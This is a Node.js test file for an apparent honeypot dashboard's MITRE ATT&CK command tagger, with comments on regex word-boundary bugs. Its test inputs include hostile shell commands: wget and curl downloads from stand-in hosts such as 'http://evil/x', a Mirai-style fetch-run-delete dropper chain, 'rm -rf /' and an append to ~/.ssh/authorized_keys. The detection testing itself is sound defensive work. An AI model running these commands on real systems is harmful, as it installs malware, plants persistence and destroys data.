const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { MITRE_SIGNATURES, MITRE_IDS, tagCommand } = require('../lib/mitre');

/**
 * Tagging failures are silent: a wrong pattern returns 200 with a wrong
 * label, forever, and no smoke test can tell. These pin the behaviour that
 * the dashboard's technique filter depends on.
 */
describe('tagCommand', () => {
  test('returns no tags for empty input rather than throwing', () => {
    assert.deepEqual(tagCommand(''), []);
    assert.deepEqual(tagCommand(null), []);
    assert.deepEqual(tagCommand(undefined), []);
  });

  test('tags a real ingress-tool-transfer drop', () => {
    assert.ok(tagCommand('wget http://1.2.3.4/bins.sh').includes('T1105'));
    assert.ok(tagCommand('curl -o /tmp/x http://evil/x').includes('T1105'));
  });

  test('tags destructive cleanup as both impact and defense evasion', () => {
    const tags = tagCommand('rm -rf /tmp/*');
    assert.ok(tags.includes('T1490'), 'expected T1490');
    assert.ok(tags.includes('T1562'), 'expected T1562');
  });

  test('assigns several techniques to one chained command', () => {
    // The real shape of a Mirai-style dropper: fetch, run, clean up.
    const tags = tagCommand('cd /tmp && wget http://x/a.sh && chmod +x a.sh && sh a.sh && rm -rf a.sh');
    for (const id of ['T1105', 'T1059', 'T1490']) {
      assert.ok(tags.includes(id), `expected ${id} in ${JSON.stringify(tags)}`);
    }
  });

  test('matches case-insensitively, as attackers do not normalise', () => {
    assert.ok(tagCommand('WGET http://x/y').includes('T1105'));
    assert.ok(tagCommand('UNAME -a').includes('T1082'));
  });

  test('does not tag a plain command that matches nothing', () => {
    assert.deepEqual(tagCommand('echo hello'), []);
  });

  test('the \\bsh\\b pattern does not fire on words merely containing "sh"', () => {
    // Guards a classic over-match: /sh/ without word boundaries tags
    // "shell", "bash" (via a different rule), "ssh", "crush", "flash"...
    assert.deepEqual(tagCommand('cat /etc/shadow'), [], 'shadow must not read as a shell');
    assert.deepEqual(tagCommand('ls /usr/share'), [], 'share must not read as a shell');
  });

  test('does not read "scp" out of the middle of another word', () => {
    // Found in production: `lscpu | grep Model` was tagged T1105 (Ingress
    // Tool Transfer) because /scp/ matches l-scp-u. Hardware profiling is
    // discovery, not a file transfer, and every bot fingerprinting the box
    // was being mislabelled.
    assert.deepEqual(tagCommand('lscpu | grep Model'), ['T1082']);
    assert.ok(!tagCommand('lscpu').includes('T1105'));
    // The real thing still tags.
    assert.ok(tagCommand('scp /tmp/x user@host:/tmp').includes('T1105'));
    assert.ok(tagCommand('cat f | scp /dev/stdin host:/x').includes('T1105'));
  });

  test('other short patterns are anchored to word boundaries too', () => {
    // Same structural weakness as scp: short tokens that appear inside
    // ordinary words.
    assert.ok(tagCommand('ps aux').includes('T1082'), 'ps must still tag');
    assert.ok(tagCommand('dig example.com').includes('T1595'), 'dig must still tag');
    assert.ok(tagCommand('ftp 10.0.0.1').includes('T1105'), 'ftp must still tag');
  });

  test('returns a stable result for the same command (cache correctness)', () => {
    const first = tagCommand('busybox wget http://x/y');
    const second = tagCommand('busybox wget http://x/y');
    assert.deepEqual(first, second);
    // The LRU hands back the same array; callers must not be able to corrupt
    // the cached value for every later request by mutating it.
    assert.equal(first, second, 'expected the cached array instance');
  });

  test('only ever emits ids that /api/public/cowrie/mitre advertises', () => {
    // The frontend keys its badge colours off these ids; an id the /mitre
    // endpoint does not list would render as an unstyled unknown chip.
    const samples = [
      'wget http://x/y', 'rm -rf /', 'uname -a', 'ssh user@host',
      'cat /proc/cpuinfo', 'nmap -sS 10.0.0.0/8', 'python -c "import os"',
      'echo >> ~/.ssh/authorized_keys', 'pkill -9 sshd', 'nproc',
    ];
    for (const cmd of samples) {
      for (const id of tagCommand(cmd)) {
        assert.ok(MITRE_IDS.has(id), `${id} is not in MITRE_IDS`);
      }
    }
  });
});

describe('MITRE_SIGNATURES', () => {
  test('every signature has the fields the API and frontend read', () => {
    for (const sig of MITRE_SIGNATURES) {
      assert.match(sig.id, /^T\d{4}$/, `bad id: ${sig.id}`);
      assert.ok(sig.name, `${sig.id} has no name`);
      assert.ok(sig.description, `${sig.id} has no description`);
      assert.ok(Array.isArray(sig.patterns) && sig.patterns.length > 0,
        `${sig.id} has no patterns`);
    }
  });

  test('ids are unique, so counts cannot be double-attributed', () => {
    assert.equal(MITRE_IDS.size, MITRE_SIGNATURES.length);
  });

  test('every pattern is case-insensitive', () => {
    // One pattern missing /i silently under-counts a whole technique.
    for (const sig of MITRE_SIGNATURES) {
      for (const p of sig.patterns) {
        assert.ok(p.flags.includes('i'), `${sig.id}: ${p} is missing the i flag`);
      }
    }
  });
});
